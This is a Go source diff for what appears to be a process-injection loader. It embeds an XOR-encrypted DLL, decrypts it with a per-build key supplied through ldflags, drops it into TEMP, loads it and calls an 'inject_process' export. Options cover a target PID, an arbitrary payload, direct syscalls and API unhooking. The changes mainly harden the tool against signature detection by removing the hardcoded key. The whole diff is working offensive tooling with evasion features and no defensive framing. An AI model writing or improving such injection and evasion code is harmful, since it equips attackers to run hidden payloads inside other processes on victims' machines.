@@ -5,26 +5,82 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"sync"
 	"syscall"
 	"time"
 	"unsafe"
 )
 
+// -----------------------------------------------------------------------------
+// Embedded encrypted libjockey.dll.
+// Encrypted at build time with a fresh random XOR key.
+// The key is injected via -ldflags "-X main.xorKeyHex=<64-hex>".
+// -----------------------------------------------------------------------------
 //go:embed libjockey.enc
 var jockeyEncrypted []byte
 
-var xorKey = []byte{
-	0x9A, 0x7C, 0x31, 0xEE, 0x42, 0xBB, 0x5D, 0x10,
-	0x88, 0x03, 0x6F, 0xA4, 0xD2, 0x55, 0x19, 0xC7,
-	0x3F, 0x81, 0x6E, 0xB0, 0x2C, 0x74, 0x95, 0x4A,
-	0xE1, 0x08, 0x57, 0xDF, 0x66, 0x2B, 0x9C, 0x13,
-}
-
+// -----------------------------------------------------------------------------
+// Lazy DLL state
+// -----------------------------------------------------------------------------
 var (
 	jockeyDLL  *syscall.LazyDLL
 	procInject *syscall.LazyProc
+
+	decodedKeyOnce sync.Once
+	decodedKey     []byte
 )
 
+// getXorKey decodes the hex-encoded build-time XOR key exactly once.
+// Panics if the key was not injected properly, since every subsequent
+// decryption would produce garbage.
+func getXorKey() []byte {
+	decodedKeyOnce.Do(func() {
+		if len(xorKeyHex) != 64 {
+			panic(fmt.Sprintf("xorKeyHex must be 64 hex chars, got %d", len(xorKeyHex)))
+		}
+		decodedKey = make([]byte, 32)
+		for i := 0; i < 32; i++ {
+			hi := hexNibble(xorKeyHex[i*2])
+			lo := hexNibble(xorKeyHex[i*2+1])
+			decodedKey[i] = (hi << 4) | lo
+		}
+	})
+	return decodedKey
+}
+
+func hexNibble(c byte) byte {
+	switch {
+	case c >= '0' && c <= '9':
+		return c - '0'
+	case c >= 'a' && c <= 'f':
+		return c - 'a' + 10
+	case c >= 'A' && c <= 'F':
+		return c - 'A' + 10
+	}
+	panic(fmt.Sprintf("invalid hex char in xorKeyHex: %q", c))
+}
+
+// decryptDLL XOR-decrypts the embedded DLL blob using the build-time key.
+func decryptDLL() []byte {
+	key := getXorKey()
+	out := make([]byte, len(jockeyEncrypted))
+	for i := range jockeyEncrypted {
+		out[i] = jockeyEncrypted[i] ^ key[i%32]
+	}
+	return out
+}
+
+// -----------------------------------------------------------------------------
+// InjectionConfig mirrors the C struct layout exactly (x64, 48 bytes):
+//   int32  method              @0
+//   uint32 targetPid           @4
+//   ptr    targetImage         @8
+//   ptr    payload            @16
+//   size_t payloadSize        @24
+//   ptr    payloadPath        @32
+//   int32  useDirectSyscalls  @40
+//   int32  unhookApi          @44
+// -----------------------------------------------------------------------------
 type InjectionConfig struct {
 	Method            int32
 	TargetPid         uint32
@@ -43,25 +99,27 @@ type InjectionResult struct {
 	Message string
 }
 
-func decryptDLL() []byte {
-	out := make([]byte, len(jockeyEncrypted))
-	for i := range jockeyEncrypted {
-		out[i] = jockeyEncrypted[i] ^ xorKey[i%32]
-	}
-	return out
-}
-
+// -----------------------------------------------------------------------------
+// Engine lifecycle
+// -----------------------------------------------------------------------------
 func loadEngine() error {
 	plain := decryptDLL()
-	name := fmt.Sprintf("tmp_%d.dll", time.Now().UnixNano())
+	if len(plain) < 2 || plain[0] != 'M' || plain[1] != 'Z' {
+		return fmt.Errorf("decrypted DLL is not a valid PE (bad key or bad build)")
+	}
+
+	// Write to a unique temp file
+	name := fmt.Sprintf("tmp_%d_%d.dll", os.Getpid(), time.Now().UnixNano())
 	path := filepath.Join(os.Getenv("TEMP"), name)
 	if err := os.WriteFile(path, plain, 0755); err != nil {
 		return fmt.Errorf("write dll: %w", err)
 	}
+
 	jockeyDLL = syscall.NewLazyDLL(path)
 	if err := jockeyDLL.Load(); err != nil {
-		return fmt.Errorf("load: %w", err)
+		return fmt.Errorf("load dll: %w", err)
 	}
+
 	procInject = jockeyDLL.NewProc("inject_process")
 	if err := procInject.Find(); err != nil {
 		return fmt.Errorf("inject_process not exported: %w", err)
@@ -69,14 +127,15 @@ func loadEngine() error {
 	return nil
 }
 
-func InitializeEngine() {
-	if err := loadEngine(); err != nil {
-		fmt.Fprintf(os.Stderr, "[FATAL] engine: %v\n", err)
-		os.Exit(1)
-	}
-	fmt.Println("[+] Execution Engine ready.")
+// InitializeEngine loads the engine and returns an error on failure.
+// Called from main() so startup can fail loudly instead of silently.
+func InitializeEngine() error {
+	return loadEngine()
 }
 
+// -----------------------------------------------------------------------------
+// Injection dispatcher
+// -----------------------------------------------------------------------------
 func InjectPayload(action string, targetPid uint32, targetImage string, payload []byte, useSyscalls, unhook bool) InjectionResult {
 	var method int32
 	switch action {
@@ -101,6 +160,7 @@ func InjectPayload(action string, targetPid uint32, targetImage string, payload 
 		cImage = uintptr(unsafe.Pointer(p))
 	}
 
+	// Copy payload into a Go-owned buffer that survives the C call.
 	var payloadPtr uintptr
 	var payBuf []byte
 	if len(payload) > 0 {
@@ -123,12 +183,13 @@ func InjectPayload(action string, targetPid uint32, targetImage string, payload 
 		TargetImage:       cImage,
 		Payload:           payloadPtr,
 		PayloadSize:       uintptr(len(payload)),
+		PayloadPath:       0,
 		UseDirectSyscalls: u,
 		UnhookApi:         h,
 	}
 
 	r, _, _ := procInject.Call(uintptr(unsafe.Pointer(&cfg)))
-	_ = payBuf
+	_ = payBuf // keep alive across the call
 
 	if int32(r) == 0 {
 		return InjectionResult{true, 0, "Injection succeeded"}
